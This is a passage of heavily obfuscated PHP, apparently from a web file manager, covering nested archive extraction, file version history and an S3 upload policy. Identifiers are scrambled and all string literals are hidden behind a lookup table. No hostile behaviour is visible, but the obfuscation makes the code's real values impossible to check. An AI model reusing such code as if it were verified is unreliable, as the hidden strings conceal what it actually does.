$û„ä·­¤[$Şä÷–©[$¦òŠØÏƒ[94]]] = $¢¹ç‚ÈÊ; } } if (!empty($û„ä·­¤)) { return array_values($û„ä·­¤); } show_json(LNG($¦òŠØÏƒ[1206]), !1); } private static function localFilePath($Òíšï°‰) { $øˆş¥ŒÂ =& $_SERVER[ú÷îèÆÜ]; $ôø®ºú = KodIO::parse($Òíšï°‰); if ($ôø®ºú[$øˆş¥ŒÂ[43]] == KodIO::KOD_SOURCE) { $ĞÄĞÛ‡É = Model($øˆş¥ŒÂ[865])->fileInfoGet(KodIO::sourceID($Òíšï°‰)); if (!$ĞÄĞÛ‡É[$øˆş¥ŒÂ[94]]) { show_json($øˆş¥ŒÂ[1244], !1); } $Òíšï°‰ = $ĞÄĞÛ‡É[$øˆş¥ŒÂ[94]]; } $Ç¾Ö²ÊÄ = self::init($Òíšï°‰); if ($Ç¾Ö²ÊÄ->pathParse[$øˆş¥ŒÂ[1192]]) { $Òíšï°‰ = $Ç¾Ö²ÊÄ->pathParse[$øˆş¥ŒÂ[1192]]; $Ç¾Ö²ÊÄ = self::init($Òíšï°‰); } $óÈ‰ƒÚ = $Ç¾Ö²ÊÄ->getType(); if ($óÈ‰ƒÚ == $øˆş¥ŒÂ[116] || $óÈ‰ƒÚ == $øˆş¥ŒÂ[1245]) { if (!$Ç¾Ö²ÊÄ->exist($Ç¾Ö²ÊÄ->path)) { show_json(LNG($øˆş¥ŒÂ[115]), !1); } return $Ç¾Ö²ÊÄ->path; } return !1; } public static function unzipPart($­³¿ƒß, $ƒïÇ£Õ˜ = -1) { $÷öÊ†½ä =& $_SERVER[ú÷îèÆÜ]; $¤ñ„ôë = IO::pathThis($­³¿ƒß); if (!$ƒïÇ£Õ˜ || $ƒïÇ£Õ˜ == -1) { $Ôæ‰Èñ = array(array($÷öÊ†½ä[42] => $¤ñ„ôë, $÷öÊ†½ä[1231] => -1)); $Ôæ‰Èñ[0][$÷öÊ†½ä[1246]] = $Ôæ‰Èñ[0][$÷öÊ†½ä[42]]; } else { if (is_array($ƒïÇ£Õ˜)) { $Ôæ‰Èñ = $ƒïÇ£Õ˜; $ËúşòÇŠ = count($Ôæ‰Èñ) - 1; for ($À—¼ŒÏ« = 0; $À—¼ŒÏ« <= $ËúşòÇŠ; $À—¼ŒÏ«++) { $Ÿè·½Éå = $Ôæ‰Èñ[$À—¼ŒÏ«]; $¡¢ø¹éˆ = get_path_this($Ÿè·½Éå[$÷öÊ†½ä[42]]) . (checkExtSafe($Ÿè·½Éå[$÷öÊ†½ä[42]]) ? $÷öÊ†½ä[22] : $÷öÊ†½ä[1247]); $Ôæ‰Èñ[$À—¼ŒÏ«][$÷öÊ†½ä[1246]] = $÷öÊ†½ä[1248] . intval($Ÿè·½Éå[$÷öÊ†½ä[1231]]) . $÷öÊ†½ä[439] . $¡¢ø¹éˆ; if ($À—¼ŒÏ« == 0) { continue; } $Ôæ‰Èñ[$À—¼ŒÏ«][$÷öÊ†½ä[1246]] = $Ôæ‰Èñ[$À—¼ŒÏ« - 1][$÷öÊ†½ä[1246]] . $÷öÊ†½ä[1249] . $Ôæ‰Èñ[$À—¼ŒÏ«][$÷öÊ†½ä[1246]]; } } } if (!is_array($Ôæ‰Èñ) || count($Ôæ‰Èñ) == 0) { return !1; } $‡¨ï…©á = $Ôæ‰Èñ[count($Ôæ‰Èñ) - 1]; if (!IO::exist($­³¿ƒß)) { return !1; } $÷ÖÑïÊ± = TEMP_FILES . $÷öÊ†½ä[1250] . kodIO::hashPathSafe($­³¿ƒß) . $÷öÊ†½ä[18]; $±ÜİÍÛé = $÷ÖÑïÊ± . $‡¨ï…©á[$÷öÊ†½ä[1246]]; mk_dir($÷ÖÑïÊ±); file_put_contents(TEMP_FILES . $÷öÊ†½ä[1225], $÷öÊ†½ä[22]); if (IO::exist($±ÜİÍÛé)) { return array($÷öÊ†½ä[224] => $±ÜİÍÛé, $÷öÊ†½ä[1230] => $Ôæ‰Èñ, $÷öÊ†½ä[1232] => $÷ÖÑïÊ±); } $‰³ìƒö¯ = self::localFilePath($­³¿ƒß); if (!$‰³ìƒö¯) { $‰³ìƒö¯ = $÷ÖÑïÊ± . $÷öÊ†½ä[1251]; if (!IO::exist($‰³ìƒö¯)) { self::copy($­³¿ƒß, $÷ÖÑïÊ±, !1, get_path_this($‰³ìƒö¯)); } } if (!$‰³ìƒö¯ || !IO::exist($‰³ìƒö¯)) { return !1; } if ($‡¨ï…©á[$÷öÊ†½ä[1231]] == -1) { return array($÷öÊ†½ä[224] => $‰³ìƒö¯, $÷öÊ†½ä[1230] => $Ôæ‰Èñ, $÷öÊ†½ä[1232] => $÷ÖÑïÊ±); } $İ¦ì› = $‰³ìƒö¯; foreach ($Ôæ‰Èñ as $À—¼ŒÏ« => $Ÿè·½Éå) { if (!$Ÿè·½Éå || $Ÿè·½Éå[$÷öÊ†½ä[1231]] == $÷öÊ†½ä[1229]) { break; } if (substr($Ÿè·½Éå[$÷öÊ†½ä[42]], -1, 1) == $÷öÊ†½ä[18]) { break; } $ëĞ¾¦î¸ = in_array(get_path_ext($Ÿè·½Éå[$÷öÊ†½ä[1246]]), array($÷öÊ†½ä[366], $÷öÊ†½ä[1236], $÷öÊ†½ä[1237], $÷öÊ†½ä[1238], $÷öÊ†½ä[1239], $÷öÊ†½ä[1240])); $üŞ‹¡é = $À—¼ŒÏ« == count($Ôæ‰Èñ) - 1 && $ëĞ¾¦î¸; $åš´Øç´ = $÷ÖÑïÊ± . $Ÿè·½Éå[$÷öÊ†½ä[1246]]; $¿ïıÀì = $÷ÖÑïÊ± . get_path_this($Ÿè·½Éå[$÷öÊ†½ä[42]]); if (IO::exist($åš´Øç´)) { $İ¦ì› = $åš´Øç´; continue; } $İŒï¬û˜ = $À—¼ŒÏ« == 0 ? get_path_ext($¤ñ„ôë) : get_path_ext($İ¦ì›); $Ã€¡Å»Ø = KodArchive::extract(self::iconvSystem($İ¦ì›), $÷ÖÑïÊ±, $Ÿè·½Éå[$÷öÊ†½ä[1231]], $¤ …†Œ¥, $İŒï¬û˜); self::unzipErrorCheck($Ã€¡Å»Ø, array($÷öÊ†½ä[1252], $­³¿ƒß, $Ôæ‰Èñ, $Ÿè·½Éå, $åš´Øç´)); if (IO::exist($¿ïıÀì)) { IO::rename($¿ïıÀì, get_path_this($åš´Øç´)); } $İ¦ì› = $åš´Øç´; } $±ÜİÍÛé = $İ¦ì›; return array($÷öÊ†½ä[224] => $İ¦ì›, $÷öÊ†½ä[1230] => $Ôæ‰Èñ, $÷öÊ†½ä[1232] => $÷ÖÑïÊ±); } private static function unzipErrorCheck($ƒØó¶÷Ä, $¤ÕÒüàÁ = false) { $‰úÂŠş¯ =& $_SERVER[ú÷îèÆÜ]; if ($ƒØó¶÷Ä[$‰úÂŠş¯[1253]]) { return !0; } write_log(array($‰úÂŠş¯[1254], $ƒØó¶÷Ä, $¤ÕÒüàÁ), $‰úÂŠş¯[1255]); show_json($‰úÂŠş¯[1256] . json_encode($ƒØó¶÷Ä[$‰úÂŠş¯[1243]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $î»ÕÈğ  =& $_SERVER[ú÷îèÆÜ]; $¥¦ş×€í = $GLOBALS[$î»ÕÈğ [16]][$î»ÕÈğ [99]]; if ($¥¦ş×€í[$î»ÕÈğ [1257]] != 1) { return; } if ($¥¦ş×€í[$î»ÕÈğ [1258]] <= 0) { return; } if (isset($_REQUEST[$î»ÕÈğ [1259]]) && $_REQUEST[$î»ÕÈğ [1259]] == $î»ÕÈğ [98]) { return; } Hook::bind($î»ÕÈğ [1260], $î»ÕÈğ [1261]); Hook::bind($î»ÕÈğ [1262], $î»ÕÈğ [1263]); Hook::bind($î»ÕÈğ [1264], $î»ÕÈğ [1265]); Hook::bind($î»ÕÈğ [1266], $î»ÕÈğ [1267]); Hook::bind($î»ÕÈğ [1268], $î»ÕÈğ [1269]); Hook::bind($î»ÕÈğ [1270], $î»ÕÈğ [1271]); } public static function eventBeforeUpload($›©Ô°) { if ($›©Ô°[3] && $›©Ô°[3] != REPEAT_REPLACE) { return; } $‰óŸ»×È = self::parsePath($›©Ô°[0]); if (!$‰óŸ»×È) { return; } self::add($‰óŸ»×È); } public static function eventBeforeEdit($ØúÙëı™) { $¸†ó¸Ê¥ = self::parsePath($ØúÙëı™[0]); if (!$¸†ó¸Ê¥) { return; } self::add($¸†ó¸Ê¥); } public static function eventBeforeCopyFile($Â”›‘Õ¹, $¤Àƒ°å, $Ëœä¾, $ŠéÔ¥€», $øÛşñÈ¥, $”˜İîº¡) { $ï—¿Éé¹ =& $_SERVER[ú÷îèÆÜ]; if (isset($Ëœä¾->_data[$ï—¿Éé¹[1196]]) && $Ëœä¾->_data[$ï—¿Éé¹[1196]]) { return; } $ÏÉĞ·µÏ = $Ëœä¾->getPathOuter($ŠéÔ¥€»); $¼à ûçÒ = self::parsePath($ÏÉĞ·µÏ); if (!$¼à ûçÒ) { return; } self::add($¼à ûçÒ); } public static function eventBeforeRename($Ó¥³éÆ) { $Æ¹Š‹ç¿ =& $_SERVER[ú÷îèÆÜ]; $Œ£§ÙÃĞ = self::parsePath($Ó¥³éÆ[0]); if (!$Œ£§ÙÃĞ) { return; } $Í‚´’™‡ = self::checkInHistory($Œ£§ÙÃĞ); if (!$Í‚´’™‡) { return; } if ($Í‚´’™‡[$Æ¹Š‹ç¿[43]] == $Æ¹Š‹ç¿[224]) { $ÒÓşŠ¸’ = self::listData($Œ£§ÙÃĞ); if ($ÒÓşŠ¸’ && $ÒÓşŠ¸’[$Æ¹Š‹ç¿[422]]) { self::moveHistory($Œ£§ÙÃĞ, $Ó¥³éÆ[1]); } } else { IO::rename($Í‚´’™‡[$Æ¹Š‹ç¿[94]], $Ó¥³éÆ[1]); } } public static function eventBeforeMove($ŞàŞ“¿ı) { $ ÌÄøÉ =& $_SERVER[ú÷îèÆÜ]; $â™¾ƒÜ = self::parsePath($ŞàŞ“¿ı[0]); if (!$â™¾ƒÜ) { return; } $Ÿ«„öô = self::parsePath($ŞàŞ“¿ı[1]); if (!$Ÿ«„öô) { return; } $­µÅˆé¾ = $ŞàŞ“¿ı[3]; $µş“¥ç© = self::checkInHistory($â™¾ƒÜ); if (!$µş“¥ç©) { return; } $ı¦ÓÚÕÕ = self::pathHistory($Ÿ«„öô); if ($µş“¥ç©[$ ÌÄøÉ[43]] == $ ÌÄøÉ[224]) { $Ñà™ŸÑ” = self::listData($â™¾ƒÜ); $Õ¼â¸Õ¬ = rtrim($Ÿ«„öô, $ ÌÄøÉ[18]) . $ ÌÄøÉ[18] . ($­µÅˆé¾ ? $­µÅˆé¾ : get_path_this($â™¾ƒÜ)); $÷İ‘úüÊ = self::listData($Õ¼â¸Õ¬); if ($Ñà™ŸÑ” && $Ñà™ŸÑ”[$ ÌÄøÉ[422]] && $÷İ‘úüÊ && $÷İ‘úüÊ[$ ÌÄøÉ[422]]) { return self::clear($â™¾ƒÜ); } if ($Ñà™ŸÑ” && $Ñà™ŸÑ”[$ ÌÄøÉ[422]]) { self::moveHistory($â™¾ƒÜ, $­µÅˆé¾, $ı¦ÓÚÕÕ); } } else { IO::move($µş“¥ç©[$ ÌÄøÉ[94]], $ı¦ÓÚÕÕ, !1, $­µÅˆé¾); self::clearEmptyFolder(IO::pathFather($µş“¥ç©[$ ÌÄøÉ[94]])); } } public static function eventAfterRemove($µ¯Á¦Ì„, $Æ¾óÁ§ó) { $— £‡Â” =& $_SERVER[ú÷îèÆÜ]; if (!$Æ¾óÁ§ó) { return; } $İ»¢ş§Š = self::parsePath($µ¯Á¦Ì„[0]); if (!$İ»¢ş§Š) { return; } $Ä°ıÅæÀ = self::checkInHistory($İ»¢ş§Š); if (!$Ä°ıÅæÀ) { return; } if ($Ä°ıÅæÀ[$— £‡Â”[43]] == $— £‡Â”[224]) { $»ÔŒ§€Ü = self::listData($İ»¢ş§Š, !1); if ($»ÔŒ§€Ü && $»ÔŒ§€Ü[$— £‡Â”[422]]) { self::clear($İ»¢ş§Š, !1); } } else { IO::remove($Ä°ıÅæÀ[$— £‡Â”[94]]); self::clearEmptyFolder(IO::pathFather($Ä°ıÅæÀ[$— £‡Â”[94]])); } } private static function checkInHistory($ÌÅŞÙµ¡) { $­œ¼Å¡‡ = self::pathHistory($ÌÅŞÙµ¡); if (!IO::exist($­œ¼Å¡‡)) { $­œ¼Å¡‡ .= $_SERVER[ú÷îèÆÜ][1272]; } return IO::exist($­œ¼Å¡‡) ? IO::info($­œ¼Å¡‡) : !1; } private static function parsePath($—ú¤è¥Ë) { $˜ÆûÆü =& $_SERVER[ú÷îèÆÜ]; if (!$—ú¤è¥Ë) { return !1; } if ($GLOBALS[$˜ÆûÆü[1273]]) { return; } $Ê£ŸñÇ¹ = KodIO::parse($—ú¤è¥Ë); $ë¶àëÏ = $Ê£ŸñÇ¹[$˜ÆûÆü[43]]; $§ÄŠê›‰ = !$ë¶àëÏ || $ë¶àëÏ == KodIO::KOD_IO || $ë¶àëÏ == KodIO::KOD_SHARE_ITEM; if (!$§ÄŠê›‰ || !$Ê£ŸñÇ¹[$˜ÆûÆü[1274]]) { return !1; } if (substr($—ú¤è¥Ë, 0, strlen(DATA_PATH . $˜ÆûÆü[1275])) == DATA_PATH . $˜ÆûÆü[1275]) { return !1; } if ($ë¶àëÏ == KodIO::KOD_SHARE_ITEM) { $ª¸çÌ‚« = IO::init($—ú¤è¥Ë); if ($ª¸çÌ‚«->pathParse[$˜ÆûÆü[1192]]) { return self::parsePath($ª¸çÌ‚«->pathParse[$˜ÆûÆü[1192]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $»ºş“é = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $˜ÆûÆü[1276]); foreach ($»ºş“é as $†ÎŠ¬Ä) { if (!$ë¶àëÏ && substr($—ú¤è¥Ë, 0, strlen($†ÎŠ¬Ä)) == $†ÎŠ¬Ä) { return !1; } } self::log($GLOBALS[$˜ÆûÆü[1187]] . $˜ÆûÆü[1277] . $—ú¤è¥Ë); return $—ú¤è¥Ë; } private static function pathHistory($™–±ËŒ„) { $ñ’‰¥Å· =& $_SERVER[ú÷îèÆÜ]; $‚äĞ¶‚Ÿ = self::$_historyBase . ltrim(KodIO::clear($™–±ËŒ„), $ñ’‰¥Å·[18]); $‚äĞ¶‚Ÿ = str_replace(array($ñ’‰¥Å·[1278]), array($ñ’‰¥Å·[1279]), $‚äĞ¶‚Ÿ); return $‚äĞ¶‚Ÿ; } public static function log($Ã”À¢á‚) { } public static function historyCount($¢°˜ğ­Ö) { $•ã¼©æ =& $_SERVER[ú÷îèÆÜ]; $Ìç”¹ş = array(); $İ´›±Û£ = array(); foreach ($¢°˜ğ­Ö as $¸à¾›êÈ) { $½ÍÜÄÛ½ = get_path_father($¸à¾›êÈ); if (!$İ´›±Û£[$½ÍÜÄÛ½]) { $İ´›±Û£[$½ÍÜÄÛ½] = array(); } $İ´›±Û£[$½ÍÜÄÛ½][] = get_path_this($¸à¾›êÈ); } foreach ($İ´›±Û£ as $½ÍÜÄÛ½ => $Õıà©¦Í) { $ˆßúà»è = self::parsePath($½ÍÜÄÛ½); if (!$ˆßúà»è) { continue; } foreach ($Õıà©¦Í as $à­ç³²ğ) { $ıÑÔ½ïŠ = self::listData(rtrim($ˆßúà»è, $•ã¼©æ[18]) . $•ã¼©æ[18] . $à­ç³²ğ, !1); if ($ıÑÔ½ïŠ && $ıÑÔ½ïŠ[$•ã¼©æ[422]]) { $Ìç”¹ş[rtrim($½ÍÜÄÛ½, $•ã¼©æ[18]) . $•ã¼©æ[18] . $à­ç³²ğ] = count($ıÑÔ½ïŠ[$•ã¼©æ[422]]); } } } return $Ìç”¹ş; } public static function add($ÖÜ‘ñÒÖ) { $òí¬ =& $_SERVER[ú÷îèÆÜ]; $ÉŠÂ…ˆ‚ = self::listData($ÖÜ‘ñÒÖ); if (!$ÉŠÂ…ˆ‚) { return; } $å„ÑúˆÎ = Model($òí¬[810])->get($òí¬[1280]); $¾ÛÈøÙ = $GLOBALS[$òí¬[16]][$òí¬[99]][$òí¬[1258]]; $§¶…íğ = $å„ÑúˆÎ == $òí¬[1281] ? min(5, $¾ÛÈøÙ) : $¾ÛÈøÙ; if ($¾ÛÈøÙ <= 0) { return; } $ãÚµåìû = IO::info($ÖÜ‘ñÒÖ); $¾ú÷Ÿ¶© = $ÉŠÂ…ˆ‚[$òí¬[422]]; if ($ãÚµåìû[$òí¬[86]] == 0) { return; } if ($ãÚµåìû[$òí¬[86]] >= 1024 * 1024 * 500) { return !1; } $öâÅ†‘ = IO::hashSimple($ÖÜ‘ñÒÖ); if ($¾ú÷Ÿ¶© && $¾ú÷Ÿ¶©[0][$òí¬[649]] == $öâÅ†‘) { return !0; } if (array_key_exists($òí¬[227], $ãÚµåìû) && !$ãÚµåìû[$òí¬[227]]) { return !1; } $Ã—·Úãé = short_id(time()); $©ëìûú¯ = array($òí¬[452] => $Ã—·Úãé, $òí¬[649] => $öâÅ†‘, $òí¬[42] => $ãÚµåìû[$òí¬[42]] . $òí¬[20] . date($òí¬[1282]) . rand_string(1), $òí¬[86] => $ãÚµåìû[$òí¬[86]], $òí¬[504] => USER_ID, $òí¬[225] => time(), $òí¬[1283] => $òí¬[22]); IO::mkdir($ÉŠÂ…ˆ‚[$òí¬[1284]]); $ıò»ñÀÀ = IO::copy($ÖÜ‘ñÒÖ, $ÉŠÂ…ˆ‚[$òí¬[1284]], !1, $©ëìûú¯[$òí¬[42]]); if (!$ıò»ñÀÀ) { self::clearEmptyFolder($ÉŠÂ…ˆ‚[$òí¬[1284]]); return !1; } array_unshift($¾ú÷Ÿ¶©, $©ëìûú¯); if (count($¾ú÷Ÿ¶©) > $§¶…íğ) { $ïÛâäÈ¯ = array_slice($¾ú÷Ÿ¶©, $§¶…íğ); foreach ($ïÛâäÈ¯ as $¨±Ô¥Ç¢) { IO::remove($ÉŠÂ…ˆ‚[$òí¬[1284]] . $¨±Ô¥Ç¢[$òí¬[42]]); } $¾ú÷Ÿ¶© = array_slice($¾ú÷Ÿ¶©, 0, $§¶…íğ); } return self::saveData($ÉŠÂ…ˆ‚[$òí¬[1285]], $¾ú÷Ÿ¶©); } public static function remove($‘ØÒššú, $òÊ€ïÛú) { $ÃøË÷’¢ =& $_SERVER[ú÷îèÆÜ]; $Š”¦´ÇÔ = self::listData($‘ØÒššú); $úÖ»«©Î = array(); if (!$Š”¦´ÇÔ) { return !1; } foreach ($Š”¦´ÇÔ[$ÃøË÷’¢[422]] as $Š¦ù°Õ) { if ($Š¦ù°Õ[$ÃøË÷’¢[452]] == $òÊ€ïÛú) { IO::remove($Š”¦´ÇÔ[$ÃøË÷’¢[1284]] . $Š¦ù°Õ[$ÃøË÷’¢[42]]); continue; } $úÖ»«©Î[] = $Š¦ù°Õ; } return self::saveData($Š”¦´ÇÔ[$ÃøË÷’¢[1285]], $úÖ»«©Î); } public static function clear($ÒÏ¦¸Š’, $ñ¤Ì“º‰ = true) { $äêÌÇ§Ï =& $_SERVER[ú÷îèÆÜ]; $úòÃ°… = self::listData($ÒÏ¦¸Š’, $ñ¤Ì“º‰); if (!$úòÃ°…) { return !1; } foreach ($úòÃ°…[$äêÌÇ§Ï[422]] as $¡óö¿ß) { IO::remove($úòÃ°…[$äêÌÇ§Ï[1284]] . $¡óö¿ß[$äêÌÇ§Ï[42]]); } return self::saveData($úòÃ°…[$äêÌÇ§Ï[1285]], array()); } public static function moveHistory($¼æ×Í‡â, $à²İÃ‘ = '', $Àò‰²É‹ = '') { $ÆôìàÛ¬ =& $_SERVER[ú÷îèÆÜ]; $‰¡´ş = self::listData($¼æ×Í‡â, !1); if (!$‰¡´ş || !$‰¡´ş[$ÆôìàÛ¬[422]]) { return !1; } $­Ù§©û§ = $ÆôìàÛ¬[1272]; $à²İÃ‘ = $à²İÃ‘ ? $à²İÃ‘ : get_path_this($¼æ×Í‡â); $Àò‰²É‹ = $Àò‰²É‹ ? $Àò‰²É‹ : $‰¡´ş[$ÆôìàÛ¬[1284]]; $¸‡ãÈÌÇ = substr(get_path_this($‰¡´ş[$ÆôìàÛ¬[1285]]), 0, -strlen($­Ù§©û§)); foreach ($‰¡´ş[$ÆôìàÛ¬[422]] as $•—÷¨¸ => $üì«¸™ğ) { $²å©ÖÂâ = $à²İÃ‘ . substr($üì«¸™ğ[$ÆôìàÛ¬[42]], strlen($¸‡ãÈÌÇ)); $“µ€š¡œ = IO::move($‰¡´ş[$ÆôìàÛ¬[1284]] . $üì«¸™ğ[$ÆôìàÛ¬[42]], $Àò‰²É‹, !1, $²å©ÖÂâ); if ($“µ€š¡œ) { $‰¡´ş[$ÆôìàÛ¬[422]][$•—÷¨¸][$ÆôìàÛ¬[42]] = $²å©ÖÂâ; } } $‰¡´ş[$ÆôìàÛ¬[1285]] = IO::move($‰¡´ş[$ÆôìàÛ¬[1285]], $Àò‰²É‹, !1, $à²İÃ‘ . $­Ù§©û§); self::saveData($‰¡´ş[$ÆôìàÛ¬[1285]], $‰¡´ş[$ÆôìàÛ¬[422]]); self::clearEmptyFolder($‰¡´ş[$ÆôìàÛ¬[1284]]); } public static function rollback($ÌñÃİ¨£, $¿±£áÇ—) { $¡¶¶ØÄ­ =& $_SERVER[ú÷îèÆÜ]; $Î¼êŠÎ´ = self::listData($ÌñÃİ¨£); if (!$Î¼êŠÎ´) { return; } $Ú·ìªñú = IO::info($ÌñÃİ¨£); foreach ($Î¼êŠÎ´[$¡¶¶ØÄ­[422]] as $›À…Éù“ => $‘•è÷û·) { if ($‘•è÷û·[$¡¶¶ØÄ­[452]] == $¿±£áÇ—) { self::add($ÌñÃİ¨£); $ÅºË½„ñ = $Î¼êŠÎ´[$¡¶¶ØÄ­[1284]] . $‘•è÷û·[$¡¶¶ØÄ­[42]]; $•ÆÀĞä® = IO::copy($ÅºË½„ñ, IO::pathFather($ÌñÃİ¨£), REPEAT_REPLACE, $Ú·ìªñú[$¡¶¶ØÄ­[42]]); if ($•ÆÀĞä®) { self::remove($ÌñÃİ¨£, $¿±£áÇ—); } return $•ÆÀĞä®; } } return !1; } public static function setDetail($é‚ú³®ğ, $–×õí§“, $ŞÌå¸ŠÅ) { $Æ›µçá… =& $_SERVER[ú÷îèÆÜ]; $£ÏåúÉ¶ = self::listData($é‚ú³®ğ); if (!$£ÏåúÉ¶) { return; } foreach ($£ÏåúÉ¶[$Æ›µçá…[422]] as $ğµâ¦ñŒ => $®ß¤È¦) { if ($®ß¤È¦[$Æ›µçá…[452]] == $–×õí§“) { $£ÏåúÉ¶[$Æ›µçá…[422]][$ğµâ¦ñŒ][$Æ›µçá…[1283]] = $ŞÌå¸ŠÅ; self::saveData($£ÏåúÉ¶[$Æ›µçá…[1285]], $£ÏåúÉ¶[$Æ›µçá…[422]]); return !0; } } return !1; } public static function fileInfo($®ÏõŸ±Æ, $¡½ï«) { $÷ÑğÈ‡» =& $_SERVER[ú÷îèÆÜ]; $Ûô©ïÓ = self::listData($®ÏõŸ±Æ); if (!$Ûô©ïÓ) { show_json(LNG($÷ÑğÈ‡»[115]), !1); } $ƒÅş¿Ñ„ = $÷ÑğÈ‡»[22]; foreach ($Ûô©ïÓ[$÷ÑğÈ‡»[422]] as $˜Ò÷ø®§ => $ê×ã™èÌ) { if ($ê×ã™èÌ[$÷ÑğÈ‡»[452]] != $¡½ï«) { continue; } $ƒÅş¿Ñ„ = $Ûô©ïÓ[$÷ÑğÈ‡»[1284]] . $ê×ã™èÌ[$÷ÑğÈ‡»[42]]; break; } if (!$ƒÅş¿Ñ„) { show_json(LNG($÷ÑğÈ‡»[115]), !1); } return IO::info($ƒÅş¿Ñ„); } public static function fileOut($£˜×Åé, $¤¨Ü‰ô¼, $²—¢†êË = false) { $î÷µïéù =& $_SERVER[ú÷îèÆÜ]; $ùİµÉÓò = self::fileInfo($£˜×Åé, $¤¨Ü‰ô¼); $ä³è¯† =& $GLOBALS[$î÷µïéù[17]]; $²—¢†êË = isset($ä³è¯†[$î÷µïéù[1235]]) && $ä³è¯†[$î÷µïéù[1235]] == 1; if (isset($ä³è¯†[$î÷µïéù[43]]) && $ä³è¯†[$î÷µïéù[43]] == $î÷µïéù[1286]) { return IO::fileOutImage($ùİµÉÓò[$î÷µïéù[94]], $ä³è¯†[$î÷µïéù[1287]]); } IO::fileOut($ùİµÉÓò[$î÷µïéù[94]], $²—¢†êË, get_path_this($£˜×Åé)); } public static function listData($Æîşçş­, $ øñèò = true) { $äçÚ½°á =& $_SERVER[ú÷îèÆÜ]; if ($ øñèò && !IO::exist($Æîşçş­)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Æîşçş­, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ù­šÛÀò = self::pathHistory($Æîşçş­); $ï•¨ö = array($äçÚ½°á[1285] => $ù­šÛÀò . $äçÚ½°á[1272], $äçÚ½°á[1284] => rtrim(get_path_father($ù­šÛÀò), $äçÚ½°á[18]) . $äçÚ½°á[18], $äçÚ½°á[422] => array()); $¾¹•øö = IO::getContent($ï•¨ö[$äçÚ½°á[1285]]); if ($¾¹•øö) { $øÎ±ºÑ• = json_decode($¾¹•øö, !0); if (is_array($øÎ±ºÑ•)) { $ï•¨ö[$äçÚ½°á[422]] = $øÎ±ºÑ•; } } return $ï•¨ö; } private static function saveData($ã´ª€Ş, $§à¦’©) { $ù“Ú¹è– =& $_SERVER[ú÷îèÆÜ]; self::log($ù“Ú¹è–[1288] . $ã´ª€Ş . $ù“Ú¹è–[81] . count($§à¦’©), $ù“Ú¹è–[791]); if ($§à¦’©) { return IO::setContent($ã´ª€Ş, json_encode($§à¦’©)); } $“èÖÎ­ = IO::pathFather($ã´ª€Ş); IO::remove($ã´ª€Ş); self::clearEmptyFolder($“èÖÎ­); return !0; } public static function clearEmptyFolder($…Ñª£·) { $ı¯ÍÀäô =& $_SERVER[ú÷îèÆÜ]; if (trim($…Ñª£·, $ı¯ÍÀäô[18]) == trim(self::$_historyBase, $ı¯ÍÀäô[18])) { return; } $ô®²»ñÛ = IO::pathFather($…Ñª£·); $ì¹Š·Ü = IO::has($…Ñª£·, !0); if ($ì¹Š·Ü[$ı¯ÍÀäô[233]] > 0 || $ì¹Š·Ü[$ı¯ÍÀäô[234]] > 0) { return; } IO::remove($…Ñª£·); self::clearEmptyFolder($ô®²»ñÛ); } private static function getBasePath() { $‡“€„ÂÉ =& $_SERVER[ú÷îèÆÜ]; $¯À´ø€¬ = Model($‡“€„ÂÉ[1289])->get($‡“€„ÂÉ[1290]); if ($¯À´ø€¬) { if (!IO::exist($¯À´ø€¬)) { IO::mkdir($¯À´ø€¬); } if (get_path_this($¯À´ø€¬) == $‡“€„ÂÉ[1275]) { $Ìà¸¨ Ê = $‡“€„ÂÉ[1291] . rand_string(8); @rename($¯À´ø€¬, get_path_father($¯À´ø€¬) . $‡“€„ÂÉ[18] . $Ìà¸¨ Ê); $¯À´ø€¬ = DATA_PATH . $Ìà¸¨ Ê . $‡“€„ÂÉ[18]; file_put_contents(DATA_PATH . $‡“€„ÂÉ[1225], $‡“€„ÂÉ[22]); Model($‡“€„ÂÉ[1289])->set($‡“€„ÂÉ[1290], $¯À´ø€¬); } return $¯À´ø€¬; } $¯À´ø€¬ = DATA_PATH . $‡“€„ÂÉ[1291] . rand_string(8) . $‡“€„ÂÉ[18]; $¯À´ø€¬ = IO::mkdir($¯À´ø€¬); $¯À´ø€¬ = rtrim($¯À´ø€¬, $‡“€„ÂÉ[18]) . $‡“€„ÂÉ[18]; file_put_contents($¯À´ø€¬ . $‡“€„ÂÉ[1225], $‡“€„ÂÉ[22]); file_put_contents(DATA_PATH . $‡“€„ÂÉ[1225], $‡“€„ÂÉ[22]); Model($‡“€„ÂÉ[1289])->set($‡“€„ÂÉ[1290], $¯À´ø€¬); return $¯À´ø€¬; } } goto Bõ„Œ–¼»É; dÕí«¿¬™: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($á·Œïªù) { parent::__construct($á·Œïªù); } public function uploadFormData($ˆŞ”ÒÇŠ, $ÚíéŒª¦ = 3600) { $²Òê°Ìï =& $_SERVER[ú÷îèÆÜ]; $îœ‹ÚÎô = $²Òê°Ìï[223]; $øÀàŸ¤ = $²Òê°Ìï[262]; $ë§ÛËíØ = $²Òê°Ìï[72]; $¥–Ä’©² = gmdate($²Òê°Ìï[263]); $ê¾€ôå¾ = gmdate($²Òê°Ìï[264]); $¦èİãÚæ = $²Òê°Ìï[265]; $Šª¸±±® = $ÚíéŒª¦ . $²Òê°Ìï[22]; $áæúóÄø = $²Òê°Ìï[266]; $Æ²Ò×üÚ = array($this->accessKey, $ê¾€ôå¾, $this->region, $ë§ÛËíØ, $¦èİãÚæ); $µØ« Ğ¾ = implode($²Òê°Ìï[18], $Æ²Ò×üÚ); $ÚìÎŠè = array($²Òê°Ìï[267] => gmdate($²Òê°Ìï[1365], strtotime($²Òê°Ìï[269])), $²Òê°Ìï[270] => array(array($²Òê°Ìï[271] => $this->bucket), array($²Òê°Ìï[272] => $îœ‹ÚÎô), array($²Òê°Ìï[273], $²Òê°Ìï[274], $²Òê°Ìï[22]), array($²Òê°Ìï[273], $²Òê°Ìï[275], $²Òê°Ìï[22]), array($²Òê°Ìï[273], $²Òê°Ìï[276], $²Òê°Ìï[22]), array($²Òê°Ìï[277] => $áæúóÄø), array($²Òê°Ìï[278] => $µØ« Ğ¾), array($²Òê°Ìï[279] => $øÀàŸ¤), array($²Òê°Ìï[280] => $¥–Ä’©²), array($²Òê°Ìï[281] => $Šª¸±±®))); $ÇöÆ ò– = base64_encode(json_encode($ÚìÎŠè)); 